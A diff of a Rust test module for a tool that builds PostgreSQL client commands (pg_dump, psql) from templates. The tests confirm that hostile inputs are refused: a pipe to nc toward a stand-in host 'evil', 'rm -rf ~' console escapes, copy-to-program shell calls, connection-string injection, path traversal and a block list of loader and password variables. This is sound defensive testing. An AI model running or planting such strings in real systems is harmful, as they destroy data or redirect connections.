+    fn profile() -> ConnectionProfile {
+        let mut profile = ConnectionProfile::new(DriverId::new("postgres"), 5433);
+        profile.host = "db.example.com".into();
+        profile.username = "app".into();
+        profile.database = "shop".into();
+        profile.ssl = SslMode::Require;
+        profile
+    }
+
+    fn request(settings: &[(&str, &str)]) -> TaskRequest {
+        TaskRequest {
+            kind: TaskKind::Backup,
+            settings: settings
+                .iter()
+                .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
+                .collect(),
+            objects: vec![
+                ObjectRef {
+                    schema: "Sales".into(),
+                    name: None,
+                },
+                ObjectRef {
+                    schema: "public".into(),
+                    name: Some("odd\"name".into()),
+                },
+            ],
+            path: "/backups/shop".into(),
         }
     }
 
     #[test]
-    fn settings_fall_back_to_defaults() {
+    fn templates_fill_from_settings_and_the_profile() {
         let task = task();
-        let mut settings = TaskSettings::new();
-        settings.insert("format".into(), "zip".into());
-        settings.insert("jobs".into(), "99".into());
-        settings.insert("other".into(), "x".into());
-        let normalized = task.normalize(&settings);
-        assert_eq!(normalized, task.defaults());
-        assert!(!task.fields[1].visible(&normalized));
-        assert_eq!(task.target(&normalized).kind, PathKind::File);
+        task.check().expect("valid");
+        let built = task
+            .build(
+                &profile(),
+                &request(&[
+                    ("format", "directory"),
+                    ("jobs", "4"),
+                    ("skip", "logs.*, audit"),
+                    ("extra", "--no-owner '--lock-wait-timeout=5s'"),
+                ]),
+            )
+            .expect("built");
+        assert_eq!(built.program, "pg_dump");
+        assert_eq!(
+            built.args,
+            [
+                "--dbname=shop",
+                "--format=d",
+                "--jobs=4",
+                "--exclude-table=logs.*",
+                "--exclude-table=audit",
+                "--file=/backups/shop",
+                "--table=\"Sales\".*",
+                "--table=\"public\".\"odd\"\"name\"",
+                "--no-owner",
+                "--lock-wait-timeout=5s",
+            ]
+        );
+        assert_eq!(
+            built.env,
+            [
+                ("PGHOST".to_owned(), "db.example.com".to_owned()),
+                ("PGPORT".to_owned(), "5433".to_owned()),
+                ("PGUSER".to_owned(), "app".to_owned()),
+                ("PGSSLMODE".to_owned(), "verify-full".to_owned()),
+            ]
+        );
+        assert_eq!(built.password_env.as_deref(), Some("PGPASSWORD"));
 
-        settings.insert("format".into(), "directory".into());
-        settings.insert("jobs".into(), "4".into());
-        let normalized = task.normalize(&settings);
-        assert_eq!(normalized["jobs"], "4");
-        assert!(task.fields[1].visible(&normalized));
-        assert_eq!(task.target(&normalized).kind, PathKind::Directory);
-        assert!(task.check().is_ok());
+        // Defaults: no jobs (1), custom, unverified TLS off on loopback.
+        let mut local = profile();
+        local.host = "localhost".into();
+        local.ssl = SslMode::Disable;
+        let built = task.build(&local, &request(&[])).expect("built");
+        assert!(built.args.contains(&"--format=c".to_owned()));
+        assert!(!built.args.iter().any(|a| a.starts_with("--jobs")));
+        assert!(
+            built
+                .env
+                .contains(&("PGSSLMODE".to_owned(), "disable".to_owned()))
+        );
+        assert!(task.vocabulary().contains(&"--format=<format>".to_owned()));
     }
 
     #[test]
-    fn tasks_cannot_name_shells_or_odd_places() {
-        let mut bad = task();
-        bad.programs = vec!["bash".into()];
-        assert!(bad.check().is_err());
-        bad.programs = vec!["../pg_dump".into()];
-        assert!(bad.check().is_err());
-        bad.programs = vec!["PowerShell.exe".into()];
-        assert!(bad.check().is_err());
-        for interpreter in ["python3.12", "perl5.30", "node20", "busybox"] {
-            bad.programs = vec![interpreter.into()];
-            assert!(bad.check().is_err(), "{interpreter}");
-        }
-
-        let mut bad = task();
-        bad.locations = vec!["relative/bin".into()];
-        assert!(bad.check().is_err());
-        bad.locations = vec!["/usr/lib/../../etc".into()];
-        assert!(bad.check().is_err());
-        bad.locations = vec![
-            "/usr/lib/postgresql/*/bin".into(),
-            r"C:\Program Files\PostgreSQL\*\bin".into(),
-        ];
-        assert!(bad.check().is_ok());
-        bad.locations = vec!["/usr/*/postgresql@*/bin".into()];
-        assert!(bad.check().is_err());
-
-        let mut bad = task();
-        bad.fields[1].default = "0".into();
-        assert!(bad.check().is_err());
-        let mut bad = task();
-        bad.fields[1].when.as_mut().expect("when").field = "nope".into();
-        assert!(bad.check().is_err());
-    }
-
-    #[test]
-    fn commands_stay_within_their_task() {
-        let task = task();
-        let mut command = ToolCommand {
-            program: "pg_dump".into(),
-            args: vec!["--file".into(), "/tmp/x".into()],
-            env: vec![("PGSSLMODE".into(), "require".into())],
-            password_env: Some("PGPASSWORD".into()),
-            stdout_to_path: false,
-            stdin_from_path: false,
+    fn templates_cannot_reach_another_server_or_run_commands() {
+        let refuse = |change: &dyn Fn(&mut Task)| {
+            let mut bad = task();
+            change(&mut bad);
+            bad.check().expect_err("refused")
         };
-        assert!(command.check(&task).is_ok());
-        command.program = "psql".into();
-        assert!(command.check(&task).is_err());
-        command.program = "pg_dump".into();
-        for name in [
-            "PATH",
-            "DYLD_INSERT_LIBRARIES",
-            "ld_preload",
-            "A=B",
-            "PSQLRC",
+        // Fixed text setting the connection by its option.
+        refuse(&|t| {
+            t.commands[0]
+                .parts
+                .push(arg(Vec::new(), vec![text("--dbname=host=evil")]));
+        });
+        // A variable the connection owns.
+        refuse(&|t| {
+            t.commands[0].variables.push(Variable {
+                when: Vec::new(),
+                name: "pghost".into(),
+                pieces: vec![text("evil")],
+            });
+        });
+        refuse(&|t| {
+            t.commands[0].variables.push(Variable {
+                when: Vec::new(),
+                name: "PGPASSWORD".into(),
+                pieces: vec![text("x")],
+            });
+        });
+        // Pipes and console commands in fixed text, choices or defaults.
+        refuse(&|t| {
+            t.commands[0]
+                .parts
+                .push(arg(Vec::new(), vec![text("--output=|nc evil 1")]));
+        });
+        refuse(&|t| {
+            if let FieldKind::Choice(choices) = &mut t.fields[0].kind {
+                choices[0].value = "\\! rm -rf ~".into();
+            }
+            t.fields[0].default = "\\! rm -rf ~".into();
+        });
+        refuse(&|t| t.fields[3].default = "--dbname=host=evil".into());
+        // Shells, undeclared programs, unknown fields.
+        refuse(&|t| {
+            t.programs.push("python3.12".into());
+        });
+        refuse(&|t| t.commands[0].program = "psql".into());
+        refuse(&|t| t.fields[1].when[0].field = "nope".into());
+        refuse(&|t| t.locations = vec!["relative/bin".into()]);
+        refuse(&|t| t.locations = vec!["/usr/../etc".into()]);
+        refuse(&|t| {
+            t.commands[0].variables.push(Variable {
+                when: Vec::new(),
+                name: "DYLD_INSERT_LIBRARIES".into(),
+                pieces: vec![text("/x")],
+            });
+        });
+        refuse(&|t| {
+            t.commands[0]
+                .parts
+                .push(CommandPart::Extra("format".into()))
+        });
+    }
+
+    #[test]
+    fn values_the_user_types_still_cannot_move_the_connection() {
+        let mut profile = profile();
+        profile.database = "x host=evil".into();
+        // As an option, `key=value` would be read as a connection string.
+        assert!(task().build(&profile, &request(&[])).is_err());
+        profile.database = "postgresql://evil/x".into();
+        assert!(task().build(&profile, &request(&[])).is_err());
+        // Through a variable it is only a name.
+        let mut through_env = task();
+        through_env.connection.database = Some(Binding::Env("PGDATABASE".into()));
+        profile.database = "x host=evil".into();
+        let built = through_env.build(&profile, &request(&[])).expect("built");
+        assert!(
+            built
+                .env
+                .contains(&("PGDATABASE".to_owned(), "x host=evil".to_owned()))
+        );
+        assert!(
+            built
+                .env
+                .contains(&("PGHOST".to_owned(), "db.example.com".to_owned()))
+        );
+    }
+
+    #[test]
+    fn downloads_are_https_digested_and_relative() {
+        let good = Download {
+            platform: "macos-aarch64".into(),
+            url: "https://example.com/pg.tar.gz".into(),
+            sha256: "a".repeat(64),
+            size: 13 << 20,
+            label: "PostgreSQL 18.6 client".into(),
+            root: "postgresql-18.6.0-aarch64-apple-darwin".into(),
+            extract: vec!["bin/pg_dump".into(), "lib/".into()],
+            bin: "bin".into(),
+        };
+        assert!(good.check().is_ok());
+        for bad in [
+            Download {
+                url: "http://example.com/pg.tar.gz".into(),
+                ..good.clone()
+            },
+            Download {
+                sha256: "abc".into(),
+                ..good.clone()
+            },
+            Download {
+                extract: vec!["../../.zshrc".into()],
+                ..good.clone()
+            },
+            Download {
+                root: "/etc".into(),
+                ..good.clone()
+            },
+            Download {
+                size: MAX_DOWNLOAD + 1,
+                ..good.clone()
+            },
+            Download {
+                platform: "plan9".into(),
+                ..good.clone()
+            },
         ] {
-            command.env = vec![(name.into(), "x".into())];
-            assert!(command.check(&task).is_err(), "{name}");
+            assert!(bad.check().is_err(), "{bad:?}");
         }
-        command.env.clear();
+    }
+
+    #[test]
+    fn typed_arguments_split_like_a_shell() {
+        assert_eq!(
+            split_args(r#"--exclude-table='a b' -t "x\"y"  --lock-wait-timeout=5s "" "#),
+            [
+                "--exclude-table=a b",
+                "-t",
+                "x\"y",
+                "--lock-wait-timeout=5s",
+                ""
+            ]
+        );
+        assert!(split_args("   ").is_empty());
+    }
+
+    #[test]
+    fn console_commands_are_spotted_but_paths_are_not() {
         for arg in [
             "--command=\\! rm -rf ~",
-            "--output=|nc evil 1",
-            "|curl x",
-            "-c \\copy t to program 'sh'",
-            "--command=\\o |sh",
             "-o|sh",
             "--command=x;\\o\tfile",
             "--command=\\gexec",
             "--execute=system rm -rf ~",
             "--command=C:\\ \\gexec",
+            "-c \\copy t to program 'sh'",
         ] {
-            command.args = vec![arg.into()];
-            assert!(command.check(&task).is_err(), "{arg}");
+            assert!(runs_commands(arg), "{arg}");
         }
-        command.args = vec![
-            "--file=/b/x.sql".into(),
-            "--set=ON_ERROR_STOP=1".into(),
-            r"--file=C:\Users\ian\insert.sql".into(),
-            r"--exclude-table=system_logs".into(),
-        ];
-        assert!(command.check(&task).is_ok());
-        command.password_env = Some("LD_PRELOAD".into());
-        assert!(command.check(&task).is_err());
+        for arg in [
+            "--file=/b/x.sql",
+            "--set=ON_ERROR_STOP=1",
+            r"--file=C:\Users\ian\insert.sql",
+            "--exclude-table=system_logs",
+            "system",
+        ] {
+            assert!(!runs_commands(arg), "{arg}");
+        }
+        assert!(env_name_ok("PGSSLROOTCERT"));
+        for name in [
+            "PATH",
+            "ld_preload",
+            "PGPASSFILE",
+            "PGSERVICEFILE",
+            "A=B",
+            "PSQLRC",
+        ] {
+            assert!(!env_name_ok(name), "{name}");
+        }
     }
 }
